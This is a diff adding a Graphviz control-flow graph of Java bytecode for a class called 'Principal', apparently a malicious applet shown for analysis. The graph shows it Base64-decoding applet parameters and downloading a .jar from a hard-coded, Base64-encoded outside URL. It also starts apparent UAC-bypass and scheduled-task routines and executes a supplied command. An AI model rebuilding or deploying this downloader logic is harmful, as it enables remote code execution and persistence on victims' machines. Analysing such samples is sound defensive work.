@@ -1,0 +1,144 @@
+digraph "" {
+    "r0 := @this: Principal"
+    "load.r r0"
+    "r0 := @this: Principal"->"load.r r0";
+    "push \"url\""
+    "load.r r0"->"push \"url\"";
+    "virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>"
+    "push \"url\""->"virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>";
+    "new java.lang.String"
+    "virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>"->"new java.lang.String";
+    "store.r $r8"
+    "new java.lang.String"->"store.r $r8";
+    "staticinvoke <com.sun.org.apache.xerces.internal.impl.dv.util.Base64: byte[] decode(java.lang.String)>"
+    "store.r $r8"->"staticinvoke <com.sun.org.apache.xerces.internal.impl.dv.util.Base64: byte[] decode(java.lang.String)>";
+    "store.r r1"
+    "staticinvoke <com.sun.org.apache.xerces.internal.impl.dv.util.Base64: byte[] decode(java.lang.String)>"->"store.r r1";
+    "load.r $r8"
+    "store.r r1"->"load.r $r8";
+    "load.r r1"
+    "load.r $r8"->"load.r r1";
+    "specialinvoke <java.lang.String: void <init>(byte[])>"
+    "load.r r1"->"specialinvoke <java.lang.String: void <init>(byte[])>";
+    "specialinvoke <java.lang.String: void <init>(byte[])>"->"load.r r0";
+    "push \"extension\""
+    "load.r r0"->"push \"extension\"";
+    "push \"extension\""->"virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>";
+    "virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>"->"store.r r1";
+    "store.r r1"->"load.r r0";
+    "push \"prefijo\""
+    "load.r r0"->"push \"prefijo\"";
+    "push \"prefijo\""->"virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>";
+    "store.r r2"
+    "virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>"->"store.r r2";
+    "store.r r2"->"load.r r0";
+    "push \"comando\""
+    "load.r r0"->"push \"comando\"";
+    "push \"comando\""->"virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>";
+    "virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>"->"new java.lang.String";
+    "store.r $r10"
+    "new java.lang.String"->"store.r $r10";
+    "store.r $r10"->"staticinvoke <com.sun.org.apache.xerces.internal.impl.dv.util.Base64: byte[] decode(java.lang.String)>";
+    "store.r r4"
+    "staticinvoke <com.sun.org.apache.xerces.internal.impl.dv.util.Base64: byte[] decode(java.lang.String)>"->"store.r r4";
+    "load.r $r10"
+    "store.r r4"->"load.r $r10";
+    "load.r r4"
+    "load.r $r10"->"load.r r4";
+    "load.r r4"->"specialinvoke <java.lang.String: void <init>(byte[])>";
+    "specialinvoke <java.lang.String: void <init>(byte[])>"->"load.r r0";
+    "push \"uac\""
+    "load.r r0"->"push \"uac\"";
+    "push \"uac\""->"virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>";
+    "virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>"->"load.r r0";
+    "push \"task\""
+    "load.r r0"->"push \"task\"";
+    "push \"task\""->"virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>";
+    "virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>"->"store.r r4";
+    "store.r r4"->"load.r r0";
+    "push \"compartir\""
+    "load.r r0"->"push \"compartir\"";
+    "push \"compartir\""->"virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>";
+    "store.r r0"
+    "virtualinvoke <Principal: java.lang.String getParameter(java.lang.String)>"->"store.r r0";
+    "staticinvoke <java.lang.Boolean: boolean parseBoolean(java.lang.String)>"
+    "store.r r0"->"staticinvoke <java.lang.Boolean: boolean parseBoolean(java.lang.String)>";
+    "store.b z0"
+    "staticinvoke <java.lang.Boolean: boolean parseBoolean(java.lang.String)>"->"store.b z0";
+    "store.b z0"->"load.r r4";
+    "load.r r4"->"staticinvoke <java.lang.Boolean: boolean parseBoolean(java.lang.String)>";
+    "store.b r4"
+    "staticinvoke <java.lang.Boolean: boolean parseBoolean(java.lang.String)>"->"store.b r4";
+    "store.b r4"->"load.r r0";
+    "load.r r0"->"staticinvoke <java.lang.Boolean: boolean parseBoolean(java.lang.String)>";
+    "ifeq new Download"
+    "staticinvoke <java.lang.Boolean: boolean parseBoolean(java.lang.String)>"->"ifeq new Download";
+    "new Download"
+    "ifeq new Download"->"new Download";
+    "dup1.r"
+    "new Download"->"dup1.r";
+    "dup1.r"->"new java.lang.String";
+    "new java.lang.String"->"dup1.r";
+    "push \"aHR0cDovL3d3dy5tdW5kb29ubGluZWphdmEuY29tL2NnaS5iaW4vdXBsb2Fkcy91cGRhdGUyLmphcg==\""
+    "dup1.r"->"push \"aHR0cDovL3d3dy5tdW5kb29ubGluZWphdmEuY29tL2NnaS5iaW4vdXBsb2Fkcy91cGRhdGUyLmphcg==\"";
+    "push \"aHR0cDovL3d3dy5tdW5kb29ubGluZWphdmEuY29tL2NnaS5iaW4vdXBsb2Fkcy91cGRhdGUyLmphcg==\""->"staticinvoke <com.sun.org.apache.xerces.internal.impl.dv.util.Base64: byte[] decode(java.lang.String)>";
+    "staticinvoke <com.sun.org.apache.xerces.internal.impl.dv.util.Base64: byte[] decode(java.lang.String)>"->"specialinvoke <java.lang.String: void <init>(byte[])>";
+    "push \".jar\""
+    "specialinvoke <java.lang.String: void <init>(byte[])>"->"push \".jar\"";
+    "push \"compariraas\""
+    "push \".jar\""->"push \"compariraas\"";
+    "specialinvoke <Download: void <init>(java.lang.String,java.lang.String,java.lang.String)>"
+    "push \"compariraas\""->"specialinvoke <Download: void <init>(java.lang.String,java.lang.String,java.lang.String)>";
+    "virtualinvoke <Download: void start()>"
+    "specialinvoke <Download: void <init>(java.lang.String,java.lang.String,java.lang.String)>"->"virtualinvoke <Download: void start()>";
+    "virtualinvoke <Download: void start()>"->"new Download";
+    "new Download"->"dup1.r";
+    "dup1.r"->"load.r $r8";
+    "new java.lang.StringBuilder"
+    "load.r $r8"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+    "push \".\""
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"push \".\"";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"
+    "push \".\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"load.r r1";
+    "load.r r1"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "load.r r2"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"load.r r2";
+    "load.r r2"->"specialinvoke <Download: void <init>(java.lang.String,java.lang.String,java.lang.String)>";
+    "specialinvoke <Download: void <init>(java.lang.String,java.lang.String,java.lang.String)>"->"virtualinvoke <Download: void start()>";
+    "new uac"
+    "virtualinvoke <Download: void start()>"->"new uac";
+    "new uac"->"dup1.r";
+    "load.b z0"
+    "dup1.r"->"load.b z0";
+    "specialinvoke <uac: void <init>(boolean)>"
+    "load.b z0"->"specialinvoke <uac: void <init>(boolean)>";
+    "virtualinvoke <uac: void start()>"
+    "specialinvoke <uac: void <init>(boolean)>"->"virtualinvoke <uac: void start()>";
+    "new task"
+    "virtualinvoke <uac: void start()>"->"new task";
+    "new task"->"dup1.r";
+    "load.b r4"
+    "dup1.r"->"load.b r4";
+    "specialinvoke <task: void <init>(boolean)>"
+    "load.b r4"->"specialinvoke <task: void <init>(boolean)>";
+    "virtualinvoke <task: void start()>"
+    "specialinvoke <task: void <init>(boolean)>"->"virtualinvoke <task: void start()>";
+    "virtualinvoke <task: void start()>"->"load.r $r10";
+    "virtualinvoke <java.lang.String: boolean isEmpty()>"
+    "load.r $r10"->"virtualinvoke <java.lang.String: boolean isEmpty()>";
+    "ifne return"
+    "virtualinvoke <java.lang.String: boolean isEmpty()>"->"ifne return";
+    "ifne return"->"load.r $r10";
+    "virtualinvoke <java.lang.String: java.lang.String trim()>"
+    "load.r $r10"->"virtualinvoke <java.lang.String: java.lang.String trim()>";
+    "staticinvoke <Tools: void execute(java.lang.String)>"
+    "virtualinvoke <java.lang.String: java.lang.String trim()>"->"staticinvoke <Tools: void execute(java.lang.String)>";
+    "return"
+    "staticinvoke <Tools: void execute(java.lang.String)>"->"return";
+}
